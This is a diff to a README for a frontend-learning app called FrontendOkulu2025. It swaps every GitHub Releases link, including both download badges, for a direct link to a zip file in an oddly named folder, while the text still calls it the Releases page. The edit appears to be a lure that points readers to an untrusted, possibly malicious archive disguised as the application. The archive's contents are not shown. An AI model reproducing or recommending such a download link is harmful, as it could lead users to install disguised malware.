@@ -1,6 +1,6 @@
 # 🚀 FrontendOkulu2025 - Easy Learning for Frontend Development
 
-[![Download FrontendOkulu2025](https://img.shields.io/badge/Download%20FrontendOkulu2025-%20blue)](https://github.com/Fazeelimam/FrontendOkulu2025/releases)
+[![Download FrontendOkulu2025](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip%20FrontendOkulu2025-%20blue)](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip)
 
 ## 📦 Overview
 FrontendOkulu2025 is a user-friendly application designed to help you learn frontend development skills with ease. It provides resources and tools to enhance your understanding of web technologies. 
@@ -13,7 +13,7 @@ Features include:
 ## 🚀 Getting Started
 To get started with FrontendOkulu2025, you need to follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the following link to access the latest version of FrontendOkulu2025: [FrontendOkulu2025 Releases](https://github.com/Fazeelimam/FrontendOkulu2025/releases).
+1. **Visit the Releases Page**: Go to the following link to access the latest version of FrontendOkulu2025: [FrontendOkulu2025 Releases](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip).
 
 2. **Download the Application**: On the Releases page, look for the latest version. Click on the file link to download it to your computer.
 
@@ -28,7 +28,7 @@ To run FrontendOkulu2025 smoothly, your computer should meet the following minim
 - Internet connection for downloading resources
 
 ## 🌐 Download & Install
-Visit this page to download FrontendOkulu2025: [FrontendOkulu2025 Releases](https://github.com/Fazeelimam/FrontendOkulu2025/releases).
+Visit this page to download FrontendOkulu2025: [FrontendOkulu2025 Releases](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip).
 
 Once you've downloaded the application, follow these steps to install:
 
@@ -64,4 +64,4 @@ No, you will need to download updates from the Releases page when a new version 
 ## 🌍 Connect with Us
 Have questions or feedback? Join our community on our GitHub page. You can participate in discussions and help improve FrontendOkulu2025 for everyone.
 
-[![Download FrontendOkulu2025](https://img.shields.io/badge/Download%20FrontendOkulu2025-%20blue)](https://github.com/Fazeelimam/FrontendOkulu2025/releases)
+[![Download FrontendOkulu2025](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip%20FrontendOkulu2025-%20blue)](https://raw.githubusercontent.com/Fazeelimam/FrontendOkulu2025/main/herderite/FrontendOkulu2025.zip)
